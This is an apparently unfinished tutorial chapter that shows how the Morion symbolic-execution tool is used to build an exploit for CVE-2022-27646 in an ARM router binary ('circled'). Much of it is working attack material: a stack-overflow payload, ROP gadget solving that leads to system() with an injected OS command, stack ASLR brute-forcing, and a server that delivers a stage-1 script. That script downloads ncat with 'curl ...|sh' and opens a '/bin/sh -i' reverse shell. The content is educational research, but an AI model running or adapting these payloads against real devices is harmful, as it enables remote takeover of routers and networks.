# Table of Contents
0. [Introduction](../README.md#introduction)
1. [Setup](./1_setup.md)
2. [Emulation](./2_emulation.md)
3. [Tracing](./3_tracing.md)
4. [Symbolic Execution](./4_symbex.md)
5. [Vulnerability CVE-2022-27646](./5_vulnerability.md)
6. [Exploitation](./6_exploitation.md#exploitation)
    1. [Analysis Module morion_control_hijacker](./6_exploitation.md#analysis-module-morion_control_hijacker)
        1. [Vulnerability Characteristics](./6_exploitation.md#vulnerability-characteristics)
        2. [Return Oriented Programming (ROP)](./6_exploitation.md#return-oriented-programming-rop)
        3. [Payload Generation](./6_exploitation.md#payload-generation)
    2. [Analysis Module morion_rop_generator](./6_exploitation.md#analysis-module-morion_rop_generator)
<!--TODO--------------------------------------------------------------------------------------------
- [X] Can we integrate morion/circled.rop3.py to circled.server.py?
- [X] Try out manual exploit
- [ ] Do in all chapters: ``` -> ```shell or ```python
- [ ] Table of Contents
- [ ] Can morion_rop_generator merge the payloads?
- [ ] Document gdb debug output to show payload works
- [ ] Create screencast using morion_pwndbg
- [ ] Remove circled.exploit.md and circled.exploit.py from git repository
- [ ] Why do we have `var:s+0`?
--------------------------------------------------------------------------------------------------->
# Exploitation
In this final chapter, we will show the usage of two **analysis modules** provided by
[Morion](https://github.com/pdamian/morion), `morion_control_hijacker` and `morion_rop_generator`
(see also [Symbolic Execution: Analysis Modules](./4_symbex.md#analysis-modules)). We will explain
how they might first help us to build a proof-of-concept (PoC) exploit, which we can then turn into
a powerful exploit, giving us a **reverse shell** on the targeted devices.

The first module, `morion_control_hijacker`, allows us to detect situations, where registers that
might influence the control-flow (typically the *pc* register), get a value assigned that relies on
a symbolic variable. Since symbolic variables typically are assigned to inputs an attacker controls,
the module helps to identify and reason about **control-flow hijacking** conditions.

Next, we will motivate the usage of a **Return Oriented Programming (ROP)** chain for our exploit to
work. [Morion](https://github.com/pdamian/morion)'s second module mentioned in this chapter,
`morion_rop_generator`, might assist us in building one that works, given the actual restrictions we might face. We can give it as inputs a candidate ROP chain (list of ROP gadgets), as well as a list
of preconditions that must be fulfilled (such as `[sp+32] == 0xb8`). The module then determines
whether such a candidate chain is feasible or not, and if so, what the attacker-controllable inputs
must be to trigger it.
## Analysis Module morion_control_hijacker
In the following, we use and analyze the concrete execution trace we recorded in
[Tracing: Run](./3_tracing.md#run). Remember that the trace has been stored to a file named
`circled.yaml` and recorded the instructions of binary `circled`, while processing the file
`circleinfo.txt`. The file `circleinfo.txt` contained the proof-of-vulnerability (PoV) payload
`"A"*1021 + " X"`.
### Vulnerability Characteristics
Let's begin by using [Morion](https://github.com/pdamian/morion)'s analysis module
`morion_control_hijacker`, with the aforementioned trace as input and review its output.

`morion_control_hijacker circled.yaml`:
```
[...]
[2024-04-11 11:35:34] [DEBG] 0x0000cf1c (ff df 8d e2): add sp, sp, #0x3fc
[2024-04-11 11:35:34] [DEBG] 0x0000cf20 (03 db 8d e2): add sp, sp, #0xc00
[2024-04-11 11:35:34] [DEBG] 0x0000cf24 (f0 8f bd e8): pop {r4, r5, r6, r7, r8, sb, sl, fp, pc}
[...]
[2024-04-11 11:35:43] [WARN] [POST] Potential control hijack due to unrestricted register 'pc'.

                      _                   _          _ _ 
 _ __ ___   ___  _ __(_) ___  _ __    ___| |__   ___| | |
| '_ ` _ \ / _ \| '__| |/ _ \| '_ \  / __| '_ \ / _ \ | |
| | | | | | (_) | |  | | (_) | | | | \__ \ | | |  __/ | |
|_| |_| |_|\___/|_|  |_|\___/|_| |_| |___/_| |_|\___|_|_|
            
Investigate potential control hijack...

Available objects:
- ctx
- ast

Type quit(), exit() or ctrl-d to leave the interpreter.

In [1]: 
```
[Morion](https://github.com/pdamian/morion) stops after the `pop` instruction at address `0xcf24`
and prints the message `Potential control hijack due to unrestricted register 'pc'`. This means that
register *pc* is based on some symbolic variable(s), i.e. in our specific example, is somehow
influenced by contents originating from file `circleinfo.txt`.
[Morion](https://github.com/pdamian/morion) entered an interactive (Python) shell that allows us to
further investigate the observed situation. For instance, we can perform a first simple test to
check whether we can set the *pc* to a different value:
```
In [1]: pc_ast = ctx.getRegisterAst(ctx.registers.pc)

In [2]: model  = ctx.getModel(pc_ast == 0xa1a2a3a4)

In [3]: pprint(model)
{
  392: 5132;;0xbeffc24c;model;fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0);s+392:8 = 0xa4,
  393: 5132;;0xbeffc24d;model;fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0);s+393:8 = 0xa3,
  394: 5132;;0xbeffc24e;model;fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0);s+394:8 = 0xa2,
  395: 5132;;0xbeffc24f;model;fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0);s+395:8 = 0xa1
}
```
The first command [1] accesses the **abstract syntax tree (AST)** representation of register *pc*.
In the second command [2] we ask the symbolic execution engine
([Triton](https://triton-library.github.io/)) for a model (or solution) to the expression
`pc_ast == 0xa1a2a3a4`. In other words, we ask what to do, to let the program flow to address
`0xa1a2a3a4`. In command[3] we then print a solution, if such a one exists. Among others, the output
of [3] tells us the following:
- The bytes we need to modify belong to a string `s` that was read from file stream `0x21ae0` using
  *libc* function `fgets`.
- We need to modify 4 bytes at string offsets 392, ..., 395 to the values `0xa4`, ..., `0xa1`.

**Note**: File stream `0x21ae0` corresponds to file `circleinfo.txt`, as explained before.

**Note**: Objects `ctx` and `ast`, as seen above, correspond to the `TritonContext` and
`AstContext`, respectively. The full documentation of Python bindings to libTrition is available
[here](https://triton-library.github.io/documentation/doxygen/py_triton_page.html).

We can finish our initial manual investigations by typing `quit` [4]. At the end of the analysis,
[Morion](https://github.com/pdamian/morion) lists a summary about the symbolic state:
```
In [4]: quit

[...]
[2024-04-11 11:37:37] [ERRO] Not terminated at a stop address: pc=0x41414140
[2024-04-11 11:37:37] [INFO] ... finished symbolic execution (pc=0x41414140).
[2024-04-11 11:37:37] [INFO] Start analyzing symbolic state...
[2024-04-11 11:37:37] [INFO] Symbolic Regs:
[2024-04-11 11:37:37] [INFO] 	pc=$$$$$$$$
[2024-04-11 11:37:37] [INFO] 	r10=$$$$$$$$
[2024-04-11 11:37:38] [INFO] 	r11=$$$$$$$$
[2024-04-11 11:37:38] [INFO] 	r4=$$$$$$$$
[2024-04-11 11:37:38] [INFO] 	r5=$$$$$$$$
[2024-04-11 11:37:38] [INFO] 	r6=$$$$$$$$
[2024-04-11 11:37:38] [INFO] 	r7=$$$$$$$$
[2024-04-11 11:37:38] [INFO] 	r8=$$$$$$$$
[2024-04-11 11:37:38] [INFO] 	r9=$$$$$$$$
[2024-04-11 11:37:38] [INFO] Symbolic Mems:
[2024-04-11 11:38:12] [INFO] 	0xbeffc0c4=$$
[2024-04-11 11:38:12] [INFO] 	...
[2024-04-11 11:38:12] [INFO] 	0xbeffc4c2=$$
[2024-04-11 11:38:12] [INFO] 	0xbeffc5c4=$$
[2024-04-11 11:38:12] [INFO] 	0xbeffc6c4=$$
[2024-04-11 11:38:12] [INFO] 	...
[2024-04-11 11:38:12] [INFO] 	0xbeffcac0=$$
[2024-04-11 11:38:12] [INFO] ... finished analyzing symbolic state.
[2024-04-11 11:38:12] [INFO] Start storing file 'circled.yaml'...
[2024-04-11 11:38:12] [INFO] ... finished storing file 'circled.yaml'.
```
At this point we learned, that registers *r4*-*r11*, as well as the *pc* are based on symbolic
variables that an attacker might control. We further verified that we can modify the *pc* to point
to another value.
### Return Oriented Programming (ROP)
- design a simple ROP chain (crashing the binary)
- why ROP chaining? data execution prevention, partly ASLR
- defeat ASLR
- binary restarts after a crash
<hr>
<figure>
  <img src="../images/ROP_Chain.svg" alt="ROP Chain"/>
  <figcaption>
    Figure 1: ROP Chain - Showing ...
  </figcaption>
</figure>
<hr>

```
pwndbg> checksec
[*] '/tmp/tmpijt0kv4v/tmpsf82yc22'
    Arch:     arm-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8000)
```

- We cannot write instructions to the stack and redirect execution to them, since our target binary
  has a non-executable (NX) stack.
- Non-executable stacks are typically targeted with Return Oriented Programming (ROP), where one
  chains multiple ROP gadgets...
- Gadget that allows us to call `system` with a controlled parameter
- We have partial/conservative ASLR
    1 - Conservative Randomization: Shared libraries, **stack**, mmap(), VDSO and heap are randomized
- As the process restarts after crashing, we have almost unlimited tries to find the correct address
- Due to no PIE, gadget 1 is at a known address
- (Characters we might not use: null-bytes, space, carriage return)

### Payload Generation
[circled.rop1.py](../morion/circled.rop1.py#L10):
```python
[...]
# Preconditions gadget 0
g0_sp_val  = ctx.getConcreteRegisterValue(ctx.registers.sp)-9*CPUSIZE.DWORD
g0_pc_ast  = ctx.getMemoryAst(MemoryAccess(g0_sp_val+8*CPUSIZE.DWORD, CPUSIZE.DWORD))
g0_pc_val  = 0xc9b8

# Solve preconditions
model = ctx.getModel(g0_pc_ast  == g0_pc_val)
pprint(model)
```

```
In [1]: run -i circled.rop1.py
{
   392:  5132;;0xbeffc24c;model;fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0);s+392:8 = 0xb8,
   393:  5132;;0xbeffc24d;model;fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0);s+393:8 = 0xc9,
   394:  5132;;0xbeffc24e;model;fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0);s+394:8 = 0x00,
   395:  5132;;0xbeffc24f;model;fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0);s+395:8 = 0x00
}
```

[circled.rop2.py](../morion/circled.rop2.py#L10):
```python
[...]
# OS command
md5_sum_len = 32
cmd         = "id>/id;#"
cmd_addr    = 0xbeffc0c4+396

# Preconditions gadget 0
g0_sp_val  = ctx.getConcreteRegisterValue(ctx.registers.sp)-9*CPUSIZE.DWORD
g0_pc_ast  = ctx.getMemoryAst(MemoryAccess(g0_sp_val+8*CPUSIZE.DWORD, CPUSIZE.DWORD))
g0_pc_val  = 0xc9b8
g0_r6_ast  = ctx.getMemoryAst(MemoryAccess(g0_sp_val+2*CPUSIZE.DWORD, CPUSIZE.DWORD))
g0_r6_val  = cmd_addr
g0__r6_ast = ctx.getMemoryAst(MemoryAccess(cmd_addr, 4*CPUSIZE.DWORD))
g0__r6_val = int.from_bytes(bytes(cmd, "UTF-8"), byteorder="little")

# Solve preconditions
model = ctx.getModel(ast.land([
                g0_pc_ast  == g0_pc_val,
                g0_r6_ast  == g0_r6_val,
                g0__r6_ast == g0__r6_val,
            ]))
pprint(model)
```

```
In [2]: run -i circled.rop2.py
{
   368:  5132;;0xbeffc234;model;fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0);s+368:8 = 0x50,
   369:  5132;;0xbeffc235;model;fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0);s+369:8 = 0xc2,
   370:  5132;;0xbeffc236;model;fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0);s+370:8 = 0xff,
   371:  5132;;0xbeffc237;model;fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0);s+371:8 = 0xbe,
   392:  5132;;0xbeffc24c;model;fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0);s+392:8 = 0xb8,
   393:  5132;;0xbeffc24d;model;fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0);s+393:8 = 0xc9,
   394:  5132;;0xbeffc24e;model;fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0);s+394:8 = 0x00,
   395:  5132;;0xbeffc24f;model;fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0);s+395:8 = 0x00,
  1419: 15451;;0xbeffc250;model;fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0);s+396:8 = 0x69,
  1420: 15451;;0xbeffc251;model;fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0);s+397:8 = 0x64,
  1421: 15451;;0xbeffc252;model;fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0);s+398:8 = 0x3e,
  1422: 15451;;0xbeffc253;model;fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0);s+399:8 = 0x2f,
  1423: 15451;;0xbeffc254;model;fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0);s+400:8 = 0x69,
  1424: 15451;;0xbeffc255;model;fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0);s+401:8 = 0x64,
  1425: 15451;;0xbeffc256;model;fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0);s+402:8 = 0x3b,
  1426: 15451;;0xbeffc257;model;fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0);s+403:8 = 0x23,
  1427: 15451;;0xbeffc258;model;fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0);s+404:8 = 0x00,
  1428: 15451;;0xbeffc259;model;fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0);s+405:8 = 0x00,
  1429: 15451;;0xbeffc25a;model;fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0);s+406:8 = 0x00,
  1430: 15451;;0xbeffc25b;model;fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0);s+407:8 = 0x00,
  1431: 15451;;0xbeffc25c;model;fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0);s+408:8 = 0x00,
  1432: 15451;;0xbeffc25d;model;fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0);s+409:8 = 0x00,
  1433: 15451;;0xbeffc25e;model;fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0);s+410:8 = 0x00,
  1434: 15451;;0xbeffc25f;model;fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0);s+411:8 = 0x00
}
```

[circled.server.py](../server/circled.server.py#L48):
```python
[...]
p  = b"A"*368
p += b"\x50\xc2\xff\xbe"
p += b"B"*20
p += b"\xb8\xc9\x00\x00"
p += b"\x69\x64\x3e\x2f"
p += b"\x69\x64\x3b\x23"
p += b"C"*617
p += b" X"
[...]
```

## Analysis Module morion_rop_generator

[circled.init.yaml](../morion/circled.init.yaml#L37):
```yaml
[...]
ropchains:
  default:
    - preconditions:
        mems:
          '[sp+32+0]': '0xb8' # pc == [sp+8*4] == 0x0000c9b8
          '[sp+32+1]': '0xc9'
          '[sp+32+2]': '0x00'
          '[sp+32+3]': '0x00'
      instruction:
        ['0x0000cf24', 'f0 8f bd e8', 'pop {r4, r5, r6, r7, r8, sb, sl, fp, pc}', 'Gadget 0.0']
    - preconditions:
      instruction:
        ['0x0000c9b8', '06 00 a0 e1', 'mov r0, r6', 'Gadget 1.0']
    - preconditions:
        regs:
          'r0': '0xbeffc250'    # r6 == 0xbeffc0c4+396 == 0xbeffc250
        mems:
          '0xbeffc250': '0x69'  # 'i'
          '0xbeffc251': '0x64'  # 'd'
          '0xbeffc252': '0x3e'  # '>'
          '0xbeffc253': '0x2f'  # '/'
          '0xbeffc254': '0x69'  # 'i'
          '0xbeffc255': '0x64'  # 'd'
          '0xbeffc256': '0x3b'  # ';'
          '0xbeffc257': '0x23'  # '#'
          '0xbeffc258': '0x00'  #
      instruction:
        ['0x0000c9bc', 'b7 f2 ff eb', 'bl #0x94a0', 'Gadget 1.1']
```

`morion_rop_generator circled.yaml default`:
```
[...]
[2024-04-16 14:16:04] [DEBG] 0x0000cf1c (ff df 8d e2): add sp, sp, #0x3fc
[2024-04-16 14:16:04] [DEBG] 0x0000cf20 (03 db 8d e2): add sp, sp, #0xc00
[2024-04-16 14:16:04] [INFO] ... finished symbolic execution (pc=0x0000cf24).
[2024-04-16 14:16:04] [INFO] Start loading preconditions of instruction 0 in ROP chain 'default'...
[2024-04-16 14:16:04] [DEBG] Regs:
[2024-04-16 14:16:04] [DEBG] Mems:
[2024-04-16 14:16:04] [DEBG] 	0xbeffc84c == 0xb8
[2024-04-16 14:16:04] [DEBG] 	0xbeffc84d == 0xc9
[2024-04-16 14:16:04] [DEBG] 	0xbeffc84e == 0x00
[2024-04-16 14:16:04] [DEBG] 	0xbeffc84f == 0x00
[2024-04-16 14:16:04] [INFO] ... finished loading preconditions of instruction 0 in ROP chain 'default'.
[2024-04-16 14:16:04] [INFO] Start solving preconditions of instruction 0 in ROP chain 'default'...
[2024-04-16 14:16:04] [DEBG] Solution:
[2024-04-16 14:16:04] [DEBG] 	0xbeffc24c: 0xb8 [inst:5132][mem][model:fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0)][var:s+392]
[2024-04-16 14:16:04] [DEBG] 	0xbeffc24d: 0xc9 [inst:5132][mem][model:fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0)][var:s+393]
[2024-04-16 14:16:04] [DEBG] 	0xbeffc24e: 0x00 [inst:5132][mem][model:fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0)][var:s+394]
[2024-04-16 14:16:04] [DEBG] 	0xbeffc24f: 0x00 [inst:5132][mem][model:fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0)][var:s+395]
[2024-04-16 14:16:04] [DEBG] 	0xbeffc0c4: 0xff [inst:15451][mem][model:fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0)][var:s+0]
[2024-04-16 14:16:04] [INFO] ... finished solving preconditions of instruction 0 in ROP chain 'default'.
[2024-04-16 14:16:04] [INFO] Start concretizing preconditions of instruction 0 in ROP chain 'default'...
[2024-04-16 14:16:04] [DEBG] Regs:
[2024-04-16 14:16:04] [DEBG] Mems:
[2024-04-16 14:16:04] [DEBG] 	0xbeffc84c: 0xb8
[2024-04-16 14:16:04] [DEBG] 	0xbeffc84d: 0xc9
[2024-04-16 14:16:04] [DEBG] 	0xbeffc84e: 0x00
[2024-04-16 14:16:04] [DEBG] 	0xbeffc84f: 0x00
[2024-04-16 14:16:04] [INFO] ... finished concretizing preconditions of instruction 0 in ROP chain 'default'...
[2024-04-16 14:16:04] [INFO] Start symbolic execution of instruction 0 in ROP chain 'default'...
[2024-04-16 14:16:04] [DEBG] 0x0000cf24 (f0 8f bd e8): pop {r4, r5, r6, r7, r8, sb, sl, fp, pc}# Gadget 0.0                                      
[2024-04-16 14:16:04] [INFO] ... finished symbolic execution of instruction 0 in ROP chain 'default'.
[2024-04-16 14:16:04] [INFO] Start loading preconditions of instruction 1 in ROP chain 'default'...
[2024-04-16 14:16:04] [DEBG] Regs:
[2024-04-16 14:16:04] [DEBG] Mems:
[2024-04-16 14:16:04] [INFO] ... finished loading preconditions of instruction 1 in ROP chain 'default'.
[2024-04-16 14:16:04] [INFO] Start solving preconditions of instruction 1 in ROP chain 'default'...
[2024-04-16 14:16:04] [DEBG] Instruction 1 of ROP chain 'default' has no preconditions.
[2024-04-16 14:16:04] [INFO] ... finished solving preconditions of instruction 1 in ROP chain 'default'.
[2024-04-16 14:16:04] [INFO] Start concretizing preconditions of instruction 1 in ROP chain 'default'...
[2024-04-16 14:16:04] [DEBG] Regs:
[2024-04-16 14:16:04] [DEBG] Mems:
[2024-04-16 14:16:04] [INFO] ... finished concretizing preconditions of instruction 1 in ROP chain 'default'...
[2024-04-16 14:16:04] [INFO] Start symbolic execution of instruction 1 in ROP chain 'default'...
[2024-04-16 14:16:04] [DEBG] 0x0000c9b8 (06 00 a0 e1): mov r0, r6              # Gadget 1.0                                      
[2024-04-16 14:16:04] [INFO] ... finished symbolic execution of instruction 1 in ROP chain 'default'.
[2024-04-16 14:16:04] [INFO] Start loading preconditions of instruction 2 in ROP chain 'default'...
[2024-04-16 14:16:04] [DEBG] Regs:
[2024-04-16 14:16:04] [DEBG] 	r0 == 0xbeffc290
[2024-04-16 14:16:04] [DEBG] Mems:
[2024-04-16 14:16:04] [DEBG] 	0xbeffc290 == 0x69
[2024-04-16 14:16:04] [DEBG] 	0xbeffc291 == 0x64
[2024-04-16 14:16:04] [DEBG] 	0xbeffc292 == 0x3e
[2024-04-16 14:16:04] [DEBG] 	0xbeffc293 == 0x2f
[2024-04-16 14:16:04] [DEBG] 	0xbeffc294 == 0x69
[2024-04-16 14:16:04] [DEBG] 	0xbeffc295 == 0x64
[2024-04-16 14:16:04] [DEBG] 	0xbeffc296 == 0x3b
[2024-04-16 14:16:04] [DEBG] 	0xbeffc297 == 0x23
[2024-04-16 14:16:04] [DEBG] 	0xbeffc298 == 0x00
[2024-04-16 14:16:04] [INFO] ... finished loading preconditions of instruction 2 in ROP chain 'default'.
[2024-04-16 14:16:04] [INFO] Start solving preconditions of instruction 2 in ROP chain 'default'...
[2024-04-16 14:16:04] [DEBG] Solution:
[2024-04-16 14:16:04] [DEBG] 	0xbeffc234: 0x90 [inst:5132][mem][model:fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0)][var:s+368]
[2024-04-16 14:16:04] [DEBG] 	0xbeffc235: 0xc2 [inst:5132][mem][model:fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0)][var:s+369]
[2024-04-16 14:16:04] [DEBG] 	0xbeffc236: 0xff [inst:5132][mem][model:fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0)][var:s+370]
[2024-04-16 14:16:04] [DEBG] 	0xbeffc237: 0xbe [inst:5132][mem][model:fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0)][var:s+371]
[2024-04-16 14:16:04] [DEBG] 	0xbeffc24c: 0xb8 [inst:5132][mem][model:fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0)][var:s+392]
[2024-04-16 14:16:04] [DEBG] 	0xbeffc24d: 0xc9 [inst:5132][mem][model:fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0)][var:s+393]
[2024-04-16 14:16:04] [DEBG] 	0xbeffc24e: 0x00 [inst:5132][mem][model:fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0)][var:s+394]
[2024-04-16 14:16:04] [DEBG] 	0xbeffc24f: 0x00 [inst:5132][mem][model:fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0)][var:s+395]
[2024-04-16 14:16:04] [DEBG] 	0xbeffc0c4: 0xff [inst:15451][mem][model:fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0)][var:s+0]
[2024-04-16 14:16:04] [DEBG] 	0xbeffc290: 0x69 [inst:15451][mem][model:fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0)][var:s+460]
[2024-04-16 14:16:04] [DEBG] 	0xbeffc291: 0x64 [inst:15451][mem][model:fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0)][var:s+461]
[2024-04-16 14:16:04] [DEBG] 	0xbeffc292: 0x3e [inst:15451][mem][model:fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0)][var:s+462]
[2024-04-16 14:16:04] [DEBG] 	0xbeffc293: 0x2f [inst:15451][mem][model:fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0)][var:s+463]
[2024-04-16 14:16:04] [DEBG] 	0xbeffc294: 0x69 [inst:15451][mem][model:fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0)][var:s+464]
[2024-04-16 14:16:04] [DEBG] 	0xbeffc295: 0x64 [inst:15451][mem][model:fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0)][var:s+465]
[2024-04-16 14:16:04] [DEBG] 	0xbeffc296: 0x3b [inst:15451][mem][model:fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0)][var:s+466]
[2024-04-16 14:16:04] [DEBG] 	0xbeffc297: 0x23 [inst:15451][mem][model:fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0)][var:s+467]
[2024-04-16 14:16:04] [DEBG] 	0xbeffc298: 0x00 [inst:15451][mem][model:fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0)][var:s+468]
[2024-04-16 14:16:04] [INFO] ... finished solving preconditions of instruction 2 in ROP chain 'default'.
[2024-04-16 14:16:04] [INFO] Start concretizing preconditions of instruction 2 in ROP chain 'default'...
[2024-04-16 14:16:04] [DEBG] Regs:
[2024-04-16 14:16:04] [DEBG] 	r0: 0xbeffc290
[2024-04-16 14:16:04] [DEBG] Mems:
[2024-04-16 14:16:04] [DEBG] 	0xbeffc290: 0x69
[2024-04-16 14:16:04] [DEBG] 	0xbeffc291: 0x64
[2024-04-16 14:16:04] [DEBG] 	0xbeffc292: 0x3e
[2024-04-16 14:16:04] [DEBG] 	0xbeffc293: 0x2f
[2024-04-16 14:16:04] [DEBG] 	0xbeffc294: 0x69
[2024-04-16 14:16:04] [DEBG] 	0xbeffc295: 0x64
[2024-04-16 14:16:04] [DEBG] 	0xbeffc296: 0x3b
[2024-04-16 14:16:04] [DEBG] 	0xbeffc297: 0x23
[2024-04-16 14:16:04] [DEBG] 	0xbeffc298: 0x00
[2024-04-16 14:16:04] [INFO] ... finished concretizing preconditions of instruction 2 in ROP chain 'default'...
[2024-04-16 14:16:04] [INFO] Start symbolic execution of instruction 2 in ROP chain 'default'...
[2024-04-16 14:16:04] [DEBG] 0x0000c9bc (b7 f2 ff eb): bl #0x94a0              # Gadget 1.1
[2024-04-16 14:16:04] [INFO] ... finished symbolic execution of instruction 2 in ROP chain 'default'.
[2024-04-16 14:16:04] [INFO] Start storing file 'circled.yaml'...
[2024-04-16 14:16:06] [INFO] ... finished storing file 'circled.yaml'.
[2024-04-16 14:16:06] [INFO] Start dumping payloads...
Payload [inst:5132][mem][model:fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0)][var:s+0]:
s+0000: 41 41 41 41 41 41 41 41
[...]
s+0360: 41 41 41 41 41 41 41 41
s+0368: 90 c2 ff be 42 42 42 42
s+0376: 42 42 42 42 42 42 42 42
s+0384: 42 42 42 42 42 42 42 42
s+0392: b8 c9 00 00
---
Payload [inst:15451][mem][model:fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0)][var:s+0]:
s+0000: ff 43 43 43 43 43 43 43
s+0008: 43 43 43 43 43 43 43 43
[...]
s+0448: 43 43 43 43 43 43 43 43
s+0456: 43 43 43 43 69 64 3e 2f
s+0464: 69 64 3b 23 00
---
[2024-04-16 14:16:06] [INFO] ... finished dumping payloads.
```

- CyberChef *From Hex* (Delimiter: `Space`) | *To Hex* (Delimiter: `0x with comma`)
- Merge payloads since they originate from the same file

[circled.server.py](../server/circled.server.py#L58):
```python
p = bytearray([
    0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,
    [...]
    0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,
    0x90,0xc2,0xff,0xbe,0x42,0x42,0x42,0x42,
    0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,
    0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42,
    0xb8,0xc9,0x00,0x00,0x43,0x43,0x43,0x43,
    0x43,0x43,0x43,0x43,0x43,0x43,0x43,0x43,
    [...]
    0x43,0x43,0x43,0x43,0x43,0x43,0x43,0x43,
    0x43,0x43,0x43,0x43,0x69,0x64,0x3e,0x2f,
    0x69,0x64,0x3b,0x23,0x00
])
```

##
- Explain `circled.server.py`
- Test reverse shell payload
- Explain reverse shell payload
- Add screencast
[circled.server.py](../server/circled.server.py#L42)
```python
[...]
# Serve requests for circleinfo.txt
if payload == "leg":
    return self.serve_file("resources/circleinfo.txt")
elif payload == "pov":
    return b"A"*1021 + b" X"
elif payload == "poc1":
    p = [...]
    return p
elif payload == "poc2":
    p = [...]
    return p
elif payload == "rsh":
    cmd = "curl http://127.0.0.1:5000/stage1|sh"
else:
    cmd = payload

# Replace spaces in the command (spaces cannot be used due to sscanf(str, "%s %s"))
cmd = "touch$\t/tmp/st0;" + cmd.replace(" ", "\t") + ";#"

# Generate payload
p  = b"A"*368                                   # [   0: 367]
p += cmd_addr.to_bytes(4, "little")             # [ 368: 371] g0_r6_val (stack addr. of OS command)
p += b"B"*20                                    # [ 372: 391]
p += b"\xb8\xc9\x00\x00"                        # [ 392: 395] g0_pc_val (code addr. of ROP gadget 1: mov r0, r6; bl #0x94a0 <system@plt>)
max_cmd_len = 1024-len(p)-2-2
p += b"X"*max(0, (max_cmd_len-len(cmd))) + b";" # [ 396:   L] Fill up with an nonexistent command
p += bytes(cmd, "UTF-8")[:max_cmd_len]          # [ L+1:1020] OS command to execute
p += b" X"                                      # String separator: sscanf(str, "%s %s", ...)
print(f"[*] Stage 0 payload: 0x{cmd_addr:08x} '{cmd:s}'")

# Brute force the stack
HttpHandler.cmd_addr = cmd_addr - 0x1000
[...]
```

[circled.server.py](../server/circled.server.py#L144):
```python
[...]
    def serve_stage1_payload(self) -> bytes:
        payload = b"""#!/bin/sh
        # Download ncat
        curl http://127.0.0.1:5000/stage1/ncat -o /tmp/ncat
        chmod +x /tmp/ncat

        # Run reverse shell
        /tmp/ncat -e "/bin/sh -i" 127.0.0.1 5001
        """
        return payload
[...]
```

We fill up with a nonexistent command `X...X;cmd` to improve ASLR brute-forcing?
## Todo
- Note: The shown exploit could easily be generated without using symbolic execution. However, we
    have chosen it since it is rather easy to follow along and suitable to explain how Morion works.

----------------------------------------------------------------------------------------------------
[Back-to-Top](./6_exploitation.md#table-of-contents)